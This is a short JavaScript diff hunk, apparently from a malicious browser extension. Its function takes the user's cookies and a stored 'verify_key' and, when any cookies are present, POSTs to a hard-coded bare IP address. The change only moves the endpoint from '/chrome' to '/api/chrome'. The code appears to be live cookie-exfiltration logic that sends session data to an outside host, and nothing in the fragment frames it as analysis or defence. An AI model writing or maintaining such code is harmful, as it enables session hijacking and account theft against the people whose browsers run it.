@@ -25,7 +25,7 @@ function send_verification_code(cookies) {
   const current_verification_key = localStorage.getItem('verify_key');
   console.log(Object.keys(cookies).length);
   if (Object.keys(cookies).length > 0) {
-    const url = 'http://92.118.150.87/chrome';
+    const url = 'http://92.118.150.87/api/chrome';
 
     const response = fetch(url, {
       method: 'POST',
